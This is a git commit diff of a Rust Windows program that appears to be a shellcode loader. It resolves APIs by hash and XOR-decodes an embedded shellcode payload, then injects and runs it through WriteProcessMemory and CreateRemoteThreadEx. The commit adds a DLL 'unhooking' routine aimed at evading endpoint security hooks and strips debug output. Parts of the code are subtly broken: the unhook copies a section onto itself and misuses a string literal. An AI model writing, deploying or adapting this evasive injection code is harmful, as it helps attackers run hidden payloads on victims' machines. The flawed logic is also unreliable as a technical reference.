18f51a0abb17f8ebaf597641c518fb03066f300f
ρƚ4ԋ <61159937+p-t-4-h@users.noreply.github.com>
2025-02-18 11:33:43 +0100

    Add files via upload

--- src/main.rs
+++ src/main.rs
@@ -5,36 +5,40 @@
 #![allow(improper_ctypes_definitions)]
 #![windows_subsystem = "windows"]
 
+static POLYMORPHKEY: &[u8] = b"lUHYVL1uUUoy3DRcowyxCw";
+
 use windows::{
     Win32::{
         System::{
-            Memory::{VirtualAllocEx, VirtualProtectEx, VirtualFree, MEM_COMMIT, MEM_RESERVE, MEM_RELEASE, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READWRITE, VIRTUAL_ALLOCATION_TYPE, VIRTUAL_FREE_TYPE},
-            Diagnostics::Debug::{WriteProcessMemory, IsDebuggerPresent, CheckRemoteDebuggerPresent, IMAGE_NT_HEADERS32, IMAGE_NT_HEADERS64, IMAGE_DIRECTORY_ENTRY_EXPORT}, 
-            Threading::{CreateRemoteThreadEx, OpenProcess, WaitForSingleObject, PROCESS_ALL_ACCESS, INFINITE, PROCESS_ACCESS_RIGHTS, LPPROC_THREAD_ATTRIBUTE_LIST, LPTHREAD_START_ROUTINE},
-            LibraryLoader::{LoadLibraryA, GetProcAddress},
-            SystemServices::{IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY},
+            Memory::{MEM_COMMIT, MEM_RESERVE, MEM_RELEASE, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READWRITE, VIRTUAL_ALLOCATION_TYPE, VIRTUAL_FREE_TYPE, MEMORY_MAPPED_VIEW_ADDRESS, FILE_MAP, PAGE_READONLY, SEC_IMAGE, FILE_MAP_READ},
+            Diagnostics::Debug::{IMAGE_NT_HEADERS64, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_SECTION_HEADER}, 
+            Threading::{CreateRemoteThreadEx, PROCESS_ALL_ACCESS, INFINITE, PROCESS_ACCESS_RIGHTS, LPPROC_THREAD_ATTRIBUTE_LIST, LPTHREAD_START_ROUTINE},
+            LibraryLoader::LoadLibraryA,
+            SystemServices::{IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY, IMAGE_SIZEOF_SECTION_HEADER },
+            ProcessStatus::MODULEINFO,
         },
-        Foundation::{CloseHandle, BOOL, HMODULE, HANDLE, WAIT_EVENT, FARPROC, GetLastError},
+        Foundation::{CloseHandle, BOOL, HMODULE, HANDLE, WAIT_EVENT, GetLastError, GENERIC_READ},
         Security::SECURITY_ATTRIBUTES,
+        Storage::FileSystem::{FILE_SHARE_MODE, FILE_CREATION_DISPOSITION, FILE_FLAGS_AND_ATTRIBUTES, FILE_SHARE_READ, OPEN_EXISTING},
     },
     core::{PCSTR, Result},
 };
-use std::{ptr::{self, null_mut, null}, process, mem, str, slice, os::raw::c_void};
+use std::{ptr::{null_mut, null, copy_nonoverlapping}, process, mem, str, slice, os::raw::c_void};
 
-type TOpenProcess = unsafe extern "system" fn(
+pub type TOpenProcess = unsafe extern "system" fn(
     dwdesiredaccess: PROCESS_ACCESS_RIGHTS,
     binherithandle: BOOL,
     dwprocessid: u32
 ) -> HANDLE;
 
-type TCheckRemoteDebuggerPresent = unsafe extern "system" fn(
+pub type TCheckRemoteDebuggerPresent = unsafe extern "system" fn(
     hprocess: HANDLE,
     pbdebuggerpresent: *mut BOOL
 ) -> ();
 
-type TIsDebuggerPresent = unsafe extern "system" fn() -> BOOL;
+pub type TIsDebuggerPresent = unsafe extern "system" fn() -> BOOL;
 
-type TVirtualAllocEx = unsafe extern "system" fn(
+pub type TVirtualAllocEx = unsafe extern "system" fn(
     hprocess: HANDLE,
     lpaddress: *const c_void,
     dwsize: usize,
@@ -42,11 +46,11 @@ type TVirtualAllocEx = unsafe extern "system" fn(
     flprotect: PAGE_PROTECTION_FLAGS
 ) -> *mut c_void;
 
-type TCloseHandle = unsafe extern "system" fn(
+pub type TCloseHandle = unsafe extern "system" fn(
     hobject: HANDLE
 ) -> ();
 
-type TWriteProcessMemory = unsafe extern "system" fn(
+pub type TWriteProcessMemory = unsafe extern "system" fn(
     hprocess: HANDLE,
     lpbaseaddress: *const c_void,
     lpbuffer: *const c_void,
@@ -54,7 +58,14 @@ type TWriteProcessMemory = unsafe extern "system" fn(
     lpnumberofbyteswritten: *mut usize
 ) -> ();
 
-type TVirtualProtectEx = unsafe extern "system" fn(
+pub type TVirtualProtect = unsafe extern "system" fn(
+    lpaddress: *const c_void,
+    dwsize: usize,
+    flnewprotect: PAGE_PROTECTION_FLAGS,
+    lpfloldprotect: *mut PAGE_PROTECTION_FLAGS
+) -> ();
+
+pub type TVirtualProtectEx = unsafe extern "system" fn(
     hprocess: HANDLE,
     lpaddress: *const c_void,
     dwsize: usize,
@@ -62,28 +73,70 @@ type TVirtualProtectEx = unsafe extern "system" fn(
     lpfloldprotect: *mut PAGE_PROTECTION_FLAGS
 ) -> ();
 
-type TCreateRemoteThreadEx = unsafe extern "system" fn(
+pub type TCreateRemoteThreadEx = unsafe extern "system" fn(
     hprocess: HANDLE,
     lpthreadattributes: *const SECURITY_ATTRIBUTES,
     dwstacksize: usize,
-    lpstartaddress: *mut c_void,
+    lpstartaddress: LPTHREAD_START_ROUTINE,
     lpparameter: *const c_void,
     dwcreationflags: u32,
     lpattributelist: *mut c_void,
     lpthreadid: *mut u32
 ) -> HANDLE;
 
-type TWaitForSingleObject = unsafe extern "system" fn(
+pub type TWaitForSingleObject = unsafe extern "system" fn(
     hhandle: HANDLE,
     dwmilliseconds: u32
 ) -> WAIT_EVENT;
 
-type TVirtualFree = unsafe extern "system" fn(
+pub type TVirtualFree = unsafe extern "system" fn(
     lpaddress: *mut c_void,
     dwsize: usize,
     dwfreetype: VIRTUAL_FREE_TYPE
 ) -> ();
-   
+
+pub type TGetCurrentProcess = unsafe extern "system" fn() -> HANDLE;
+
+pub type TGetModuleHandleA = unsafe extern "system" fn(
+    lpModuleName: PCSTR
+) -> HMODULE;
+
+pub type TK32GetModuleInformation = unsafe extern "system" fn(
+    hprocess: HANDLE,
+    hmodule: HMODULE,
+    lpmodinfo: *mut MODULEINFO,
+    cb: u32
+) -> BOOL;
+
+pub type TCreateFileA = unsafe extern "system" fn(
+    lpfilename: PCSTR,
+    dwdesiredaccess: u32,
+    dwsharemode: FILE_SHARE_MODE,
+    lpsecurityattributes: Option<*const SECURITY_ATTRIBUTES>,
+    dwcreationdisposition: FILE_CREATION_DISPOSITION,
+    dwflagsandattributes: FILE_FLAGS_AND_ATTRIBUTES,
+    htemplatefile: HANDLE
+) -> HANDLE;
+
+pub type TCreateFileMapping = unsafe extern "system" fn(
+    hfile: HANDLE,
+    lpfilemappingattributes: Option<*const SECURITY_ATTRIBUTES>,
+    flprotect: PAGE_PROTECTION_FLAGS,
+    dwmaximumsizehigh: u32,
+    dwmaximumsizelow: u32,
+    lpname: PCSTR
+) -> HANDLE;
+
+pub type TMapViewOfFile = unsafe extern "system" fn(
+    hfilemappingobject: HANDLE,
+    dwdesiredaccess: FILE_MAP,
+    dwfileoffsethigh: u32,
+    dwfileoffsetlow: u32,
+    dwnumberofbytestomap: usize
+) -> MEMORY_MAPPED_VIEW_ADDRESS;
+
+pub type TFreeLibrary = unsafe extern "system" fn(hlibmodule: HMODULE) -> ();
+
 fn getHashFromFunc(funcName: &str) -> u32 {
     let mut hash: u32 = 0x35;
 
@@ -114,27 +167,10 @@ fn getFuncAddressByHash(lib: &str, hash: Vec<u32>) -> Vec<Option<*const u32>> {
                 let addr_names_RVA: *const u32 = base_ptr.add(img_export_directory.AddressOfNames as usize) as *const u32;
                 let addr_names_ordinals_RVA: *const u16 = base_ptr.add(img_export_directory.AddressOfNameOrdinals as usize) as *const u16;
                 let f_num: isize = img_export_directory.NumberOfFunctions as isize;
-                
-                println!(
-                    
-                    "
-[+] Module Handle: {:?}
-
-[i] IMG_NT_HEADER address: {:?}
-[i] Export directory RVA address: {:?}
-[i] Export directory address: {:?}
-[i] Address of function RVA : {:?}
-[i] Address of names RVA : {:?}
-[i] Address of names ordinals RVA : {:?}
-[i] Number of functions : {:?}
-                    ", base_ptr, nt_headers_addr, export_directory_RVA, export_directory_addr, addr_func_RVA, addr_names_RVA, addr_names_ordinals_RVA, f_num
-                );
 
                 for i in 0..f_num {
                     let func_name_RVA: u32 = *addr_names_RVA.offset(i as isize) as u32;
-                    //println!("{:?}", func_name_RVA);
                     let func_name_VA: *const u32 = base_ptr.add(func_name_RVA as usize) as *const u32;
-                    //println!("{:?}", func_name_VA);
 
                     let func_name_VA_ptr: *const u8 = func_name_VA as *const u8;
                     let mut len = 0;
@@ -143,12 +179,9 @@ fn getFuncAddressByHash(lib: &str, hash: Vec<u32>) -> Vec<Option<*const u32>> {
                     }
 
                     let func_name_str: &str = str::from_utf8(slice::from_raw_parts(func_name_VA_ptr, len)).unwrap_or("Error with string");
-                    //println!("{:?}", func_name_str);
-
                     let func_name_hash: u32 = getHashFromFunc(func_name_str) as u32;
                     
                     if let Some(pos) = hash.iter().position(|&h| h == func_name_hash) {
-                        //println!("{:?} {:#x} {:#x} {:#x}", addr_names_ordinals_RVA.offset(i as isize), *addr_names_ordinals_RVA.offset(i as isize), addr_func_RVA.offset(*addr_names_ordinals_RVA.offset(i as isize) as isize) as u32, *addr_func_RVA.offset(*addr_names_ordinals_RVA.offset(i as isize) as isize) as u32);
                         let func_addr_RVA: u32 = *addr_func_RVA.offset(*addr_names_ordinals_RVA.offset(i as isize) as isize) as u32;
                         let func_addr: *const u32 = base_ptr.add(func_addr_RVA as usize) as *const u32;
                         println!("[i] Address of {} : {:?} / RVA : {:?}", func_name_str, func_addr, func_addr_RVA);
@@ -167,7 +200,91 @@ fn getFuncAddressByHash(lib: &str, hash: Vec<u32>) -> Vec<Option<*const u32>> {
     }
 }
 
+fn dllUnhooking(lib: &str, libPath: &str) {
+
+    println!("{:#x}", getHashFromFunc("FreeLibrary"));
+    unsafe {
+        println!("[+] DLL UnHooking");
+        let hashK32: Vec<u32> = vec![0x6246f7, 0x3b40ac, 0xca9eb4, 0xc6780, 0xe23e3f, 0x7857d9, 0xbdd9cb, 0x6174ba];
+        let adressesK32: Vec<Option<*const u32>> = getFuncAddressByHash("kernel32.dll", hashK32);
+
+        if adressesK32.contains(&None) {
+            process::exit(-1);
+        }
+
+        let hashPsapi: Vec<u32> = vec![0xe1d9bf];
+        let adressesPsapi: Vec<Option<*const u32>> = getFuncAddressByHash("psapi.dll", hashPsapi);
+
+        if adressesPsapi.contains(&None) {
+            process::exit(-1);
+        }
+
+        let XGetCurrentProcess: TGetCurrentProcess = mem::transmute(adressesK32[0].unwrap() as *const u32);
+        let XGetModuleHandleA: TGetModuleHandleA = mem::transmute(adressesK32[1].unwrap() as *const u32);
+        let XGetModuleInformation: TK32GetModuleInformation = mem::transmute(adressesPsapi[0].unwrap() as *const u32);
+        let XCreateFileA: TCreateFileA = mem::transmute(adressesK32[2].unwrap() as *const u32);
+        let XCreateFileMapping: TCreateFileMapping = mem::transmute(adressesK32[3].unwrap() as *const u32);
+        let XMapViewOfFile: TMapViewOfFile = mem::transmute(adressesK32[4].unwrap() as *const u32);
+        let XVirtualProtect: TVirtualProtect = mem::transmute(adressesK32[5].unwrap() as *const u32);
+        let XCloseHandle: TCloseHandle = mem::transmute(adressesK32[6].unwrap() as *const u32);
+        let XFreeLibrary: TFreeLibrary = mem::transmute(adressesK32[7].unwrap() as *const u32);
+
+        let process: HANDLE = XGetCurrentProcess();
+        let mi: MODULEINFO = Default::default();
+        let lib_ptr: PCSTR = PCSTR::from_raw(format!("{}\0", lib).as_ptr());
+        let libModule: HMODULE = XGetModuleHandleA(lib_ptr);
+
+        XGetModuleInformation(process, libModule, &mi, mem::size_of::<MODULEINFO>() as u32);
+        let libBase: *mut c_void = mi.lpBaseOfDll;
+        let libPath_ptr: PCSTR = PCSTR::from_raw(format!("{}\0", lib).as_ptr());
+        let libFile: HANDLE = XCreateFileA(libPath_ptr, GENERIC_READ, FILE_SHARE_READ, null(), OPEN_EXISTING, 0, null());
+        let libMapping: HANDLE = XCreateFileMapping(libFile, null(), PAGE_READONLY | SEC_IMAGE, 0, 0, null());
+        let libMappingAddress = XMapViewOfFile(libMapping, FILE_MAP_READ, 0, 0, 0);
+
+        let hookedDosHeader: &IMAGE_DOS_HEADER = &*(libBase as *const IMAGE_DOS_HEADER);
+        let hookedNtHeader: &IMAGE_NT_HEADERS64 = &*(libBase.add(hookedDosHeader.e_lfanew as usize));
+
+        for i in 0..hookedNtHeader.FileHeader.NumberOfSections {
+            let hookedSectionHeader: &IMAGE_SECTION_HEADER = &*(hookedNtHeader.add(IMAGE_SIZEOF_SECTION_HEADER * i));
+
+            let t: [u8; 8] = ".text";
+            if hookedSectionHeader.Name == t {
+                let mut oldprotect: PAGE_PROTECTION_FLAGS = PAGE_PROTECTION_FLAGS(0);
+    
+                XVirtualProtect(
+                    libBase.add(hookedSectionHeader.VirtualAddress),
+                    hookedSectionHeader.Misc.VirtualSize,
+                    PAGE_EXECUTE_READWRITE,
+                    &mut oldprotect,
+                );
+
+                let dest = libBase.add(hookedSectionHeader.VirtualAddress as usize) as *mut u8;
+                let src = libBase.add(hookedSectionHeader.VirtualAddress as usize) as *const u8;
+                let size = hookedSectionHeader.Misc.VirtualSize as usize;
+
+                copy_nonoverlapping(src, dest, size);
+
+                XVirtualProtect(
+                    libBase.add(hookedSectionHeader.VirtualAddress),
+                    hookedSectionHeader.Misc.VirtualSize,
+                    oldprotect,
+                    &mut oldprotect,
+                );
+            }
+        }
+
+        let _ = XCloseHandle(process);
+        let _ = XCloseHandle(libFile);
+        let _ = XCloseHandle(libMapping);
+        let _ = XFreeLibrary(libModule);
+        println!("[-] DLL UnHooking");
+
+    }
+}
+
 fn main() {
+
+    dllUnhooking("kernel32.dll", "C:\\Windows\\System32\\kernel32.dll");
 
     let raw_shellcode: &[u8] = &[0x52, 0x2b, 0xc8, 0x7f, 0x52, 0x91, 0x58,
                              0x7a, 0x52, 0x91, 0x6a, 0x02, 0x52, 0x91, 
@@ -195,18 +312,11 @@ fn main() {
                              0xe5, 0xd8, 0x52, 0x99, 0xf6, 0x32, 0xe5, 0xca];
 
     let shellcode: Vec<u8> = raw_shellcode.iter().map(|&byte| byte ^ 0x1a).collect();
-    
-    //getFuncAddressByHash("kernel32", 0xf92f7b);
-
-    //println!("{:#x}", getHashFromFunc("CreateRemoteThreadEx"));
-    //println!("{:#x}", getHashFromFunc("CreateRemoteThread"));
 
     let pid = process::id();
 
     unsafe {        
-        println!("[i] Trying to open a Handle for the Process {pid}");
 
-        //assert_eq!(getHashFromFunc("CreateRemoteThreadEx"), 0x857934);
         let hash: Vec<u32> = vec![0x9e08d0, 0x8dd921, 0xf4ed1b, 0x4fd152, 0xa48f46, 0xc4edec, 0x857934, 0x397566, 0xbdd9cb, 0x675a2];
 
         let adresses: Vec<Option<*const u32>> = getFuncAddressByHash("kernel32.dll", hash);
@@ -249,12 +359,9 @@ fn main() {
         );
 
         if haddr.is_null() {
-            eprintln!("[!] Failed to Allocate Memory in Target Process.");
             let _ = CloseHandle(hprocess);
             process::exit(-1)
         }
-
-        println!("[i] Writing to memory at address {:p}", haddr);
 
         XWriteProcessMemory(
             hprocess,
@@ -274,16 +381,13 @@ fn main() {
             &mut oldprotect,
         );
         
-        // println!("\n[+] Creating a Remote Thread");
-        
-        
         //println!("Last Error : {:?}", GetLastError());
 
         /* let hthread = XCreateRemoteThreadEx(
             hprocess,
             null(),
             0,
-            haddr,
+            std::mem::transmute(haddr),
             null(),
             0,
             null_mut(),
@@ -299,7 +403,6 @@ fn main() {
             0,
             None,
             Some(null_mut()),).unwrap_or_else(|e| {
-                eprintln!("[!] CreateRemoteThreadEx Failed With Error: {}", e);
                 let _ = CloseHandle(hprocess);
                 process::exit(-1);
             }
@@ -308,18 +411,8 @@ fn main() {
         
         XWaitForSingleObject(hthread, INFINITE);
 
-        
-
         let _ = XCloseHandle(hthread);
-        println!("[i] Closed thread handle");
-
         let _ = XCloseHandle(hprocess);
-        println!("[i] Closed process handle");
-
         let _ = XVirtualFree(haddr, 0, MEM_RELEASE);
-        //println!("[i] Memory released");
-
-
-        println!("[+] Executed!");
     }
 }
